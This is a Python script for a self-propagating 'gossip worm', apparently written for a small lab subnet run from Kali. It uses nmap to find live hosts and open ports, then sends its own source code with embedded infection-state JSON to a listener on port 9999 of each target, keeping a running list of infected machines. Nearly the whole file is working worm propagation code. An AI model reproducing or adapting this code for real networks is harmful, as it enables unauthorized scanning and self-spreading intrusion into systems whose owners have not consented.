import socket
import nmap
import json
import os
import time
from datetime import datetime

COLLECTOR_IP = "192.168.100.10"
COLLECTOR_PORT = 8888
WORM_PORT = 9999
IP_RANGE = [f"192.168.100.{i}" for i in range(11, 16)]

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.100.10", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def is_alive(ip):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip, arguments='-sn -T4')
    return nm[ip].state() == 'up' if ip in nm.all_hosts() else False

def scan_ports(host):
    print(f"[*] Scanning ports on {host}...")
    nm = nmap.PortScanner()
    nm.scan(hosts=host, arguments=f'-T4 -p 21,22,80,443,3306,8080')
    open_ports = []
    if host in nm.all_hosts():
        for port in [21, 22, 80, 443, 3306, 8080]:
            try:
                if nm[host]['tcp'][port]['state'] == 'open':
                    open_ports.append(port)
            except:
                pass
    print(f"[+] {host} open ports: {open_ports if open_ports else 'none'}")
    return open_ports

def spread(target_ip, my_ip, hop_count, infected):
    try:
        with open(__file__, "r") as f:
            lines = f.readlines()
        if lines[0].startswith("# STATE:"):
            lines = lines[1:]
        worm_code = "".join(lines)
        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected
        })
        final_code = f"# STATE:{state}\n" + worm_code
        s = socket.socket()
        s.settimeout(5)
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()
        print(f"[+] Payload sent to {target_ip}")
        return True
    except Exception as e:
        print(f"[-] Spread failed: {target_ip} — {e}")
        return False

def main():
    if os.path.exists("/tmp/w2_lock"):
        print("[!] Already running — exiting")
        return
    open("/tmp/w2_lock", "w").close()

    print("================================")
    print("      W2 GOSSIP WORM START      ")
    print("================================")

    my_ip = get_my_ip()

    try:
        with open(__file__, "r") as f:
            first_line = f.readline()
        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]
            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}")
        else:
            raise ValueError("no state")
    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        print("[+] Fresh start on Kali")

    my_index = IP_RANGE.index(my_ip) if my_ip in IP_RANGE else -1

    targets = []
    for ip in IP_RANGE[my_index + 1:]:
        if len(targets) == 2:
            break
        if ip in infected:
            print(f"[~] {ip} already infected, skipping")
            continue
        print(f"[*] Checking {ip}...")
        if is_alive(ip):
            targets.append(ip)
            print(f"[+] Found alive host: {ip}")

    if not targets:
        print("[!] No targets found — stopping")
        os.remove("/tmp/w2_lock")
        return

    for target in targets:
        scan_ports(target)
        success = spread(target, my_ip, hop_count, infected)
        if success:
            infected.append(target)
            print(f"[+] Infection chain: {infected}")

    os.remove("/tmp/w2_lock")

main()
